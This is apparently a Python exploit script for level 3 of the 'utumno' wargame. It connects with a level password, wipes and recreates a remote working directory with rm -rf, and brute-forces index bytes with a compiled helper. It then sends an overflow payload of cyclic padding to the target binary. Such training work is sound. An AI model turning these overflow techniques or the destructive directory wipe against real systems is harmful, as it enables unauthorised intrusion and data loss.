from lib.exploit import *
import time
'''

'''

gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble
unset env
show env


r



'''

LEVEL = "3"

# s = connect_to_local(LEVEL, "zuudafiine", remote=False)
s = connect(LEVEL, "zuudafiine")
from lib.exploit import *


remote_payload_file = CWD + "payload"

s.process(["rm", "-rf", CWD]).recvall()
s.process(["mkdir", CWD]).recvall()
upload(s, gdb_script, CWD + "gdb.script")

log.info("%s " % process("gcc -no-pie -m32 reverse.c -o reverse", cwd="/home/kali/PycharmProjects/utumno/3/reverse", shell=True).recvall())
log.info("%s " % process(["chmod", "a+x", "/home/kali/PycharmProjects/utumno/3/reverse/reverse"]).recvall())


def get_xored_values(start_index):
    result_chars = b""
    curr_wanted_index = start_index
    for i in range(23):
        for j in range(255):
            log.info(f"i: {i}")
            log.info(f"j: {j}")
            r = process(["/home/kali/PycharmProjects/utumno/3/reverse/reverse", chr(j), str(i)]).recvall()
            log.info(f"r: {r}")
            index = unpack(r, 8)
            if index == curr_wanted_index:
                curr_wanted_index += 1
                result_chars += pack(index, 8)
                break
            if index == 255:
                log.error(f"failed for index %d" % i)
                exit(1)
                # return
    return result_chars


def execute(s,xored_index_values, payload):
    assert len(payload) == len(xored_index_values)
    io = s.process([BINARY_PATH])
    for i in range(len(xored_index_values)):
        xored_index_val = xored_index_values[i]
        overflow_val = payload[i]
        append_to_remote_file(s, pack(xored_index_val, 8), remote_payload_file)
        append_to_remote_file(s, pack(overflow_val, 8), remote_payload_file)
        io.send(pack(xored_index_val, 8))
        io.send(pack(overflow_val, 8))


# xored_index_values = get_xored_values(24)
xored_index_values = b'\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-'
padding = bytes(cyclic(len(xored_index_values), alphabet=string.ascii_uppercase),"utf-8")
execute(s, xored_index_values, padding)

